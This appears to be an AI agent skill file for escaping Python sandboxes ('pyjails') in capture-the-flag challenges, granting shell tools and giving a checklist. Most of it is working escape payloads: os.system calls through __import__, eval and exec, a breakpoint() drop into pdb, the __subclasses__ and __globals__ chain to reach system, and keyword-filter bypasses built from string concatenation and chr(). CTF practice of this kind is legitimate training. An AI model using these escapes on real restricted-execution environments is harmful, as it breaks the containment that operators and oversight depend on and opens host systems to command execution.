---
name: pyjail
description: Escapes Python sandbox restrictions. Use when working with restricted Python eval/exec environments, sandbox escapes, filtered input challenges, or Python jail challenges.
allowed-tools: Bash, Read, Write, Grep, Glob
---

# Python Jail Escape Skill

## Quick Workflow

```
Progress:
- [ ] Identify restrictions (blocked keywords/chars)
- [ ] Try basic escapes first
- [ ] If builtins blocked, use class hierarchy
- [ ] Bypass filters with encoding/concatenation
- [ ] Execute command to get flag
```

## Quick Reference - Common Escapes

```python
# Basic command execution
__import__('os').system('cat flag.txt')
eval("__import__('os').system('id')")
exec("import os; os.system('ls')")

# Using breakpoint (Python 3.7+)
breakpoint()  # Drops into pdb, then !cat flag.txt

# No builtins - class hierarchy
().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('cat flag')

# Keyword bypass
__import__('o'+'s').system('cat flag')
__import__(chr(111)+chr(115)).system('cat flag')
```

## Reference Files

| Topic | Reference |
|-------|-----------|
| Bypass Techniques | [reference/bypass.md](reference/bypass.md) |
| Complete Payloads | [reference/payloads.md](reference/payloads.md) |

## Quick Debugging

```python
# Find useful class index
for i, c in enumerate(().__class__.__base__.__subclasses__()):
    if 'wrap' in str(c): print(i, c)

# Check available builtins
dir(__builtins__)
```
